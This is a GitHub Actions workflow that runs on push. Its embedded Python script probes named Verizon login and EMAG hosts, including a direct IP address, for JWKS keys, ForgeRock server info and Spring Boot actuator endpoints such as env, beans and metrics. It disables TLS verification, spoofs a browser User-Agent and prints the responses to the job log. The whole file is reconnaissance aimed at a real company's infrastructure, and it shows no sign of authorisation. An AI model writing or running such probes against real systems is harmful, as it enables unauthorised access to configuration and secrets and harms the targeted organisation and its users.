name: EMAG CRIT-01 JWKS
on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  crit01:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: JWKS and ForgeRock probe
        run: |
          python3 - << 'PYEOF'
          import urllib.request, urllib.error, json, ssl
          
          ctx = ssl.create_default_context()
          ctx.check_hostname = False
          ctx.verify_mode = ssl.CERT_NONE
          
          targets = [
              ('JWKS vzwmb realm', 'https://mblogin.verizonwireless.com/am/oauth2/vzwmb/connect/jwk_uri'),
              ('JWKS root realm', 'https://mblogin.verizonwireless.com/am/oauth2/connect/jwk_uri'),
              ('JWKS direct IP', 'https://69.78.159.216/am/oauth2/vzwmb/connect/jwk_uri'),
              ('vzauth JWKS', 'https://mblogin.verizonwireless.com/vzauth/json/realms/root/realms/vzwmb/connect/jwk_uri'),
              ('vzauth root JWKS', 'https://mblogin.verizonwireless.com/vzauth/json/connect/jwk_uri'),
              ('serverinfo', 'https://mblogin.verizonwireless.com/vzauth/json/serverinfo/*'),
              ('EMAG ping', 'https://ess.emag.verizonwireless.com/emag/ping'),
              ('EMAG health', 'https://ess.emag.verizonwireless.com/actuator/health'),
              ('EMAG metrics', 'https://ess.emag.verizonwireless.com/actuator/metrics'),
              ('EMAG env', 'https://ess.emag.verizonwireless.com/actuator/env'),
              ('EMAG beans', 'https://ess.emag.verizonwireless.com/actuator/beans'),
          ]
          
          for name, url in targets:
              try:
                  req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                  with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
                      body = r.read(2048).decode('utf-8', errors='replace')
                      print(f'[{r.status}] {name}: {body[:500]}')
              except urllib.error.HTTPError as e:
                  body = e.read(512).decode('utf-8', errors='replace')
                  print(f'[HTTP {e.code}] {name}: {body[:200]}')
              except Exception as e:
                  print(f'[ERR] {name}: {str(e)[:100]}')
          
          print('PROBE COMPLETE')
          PYEOF
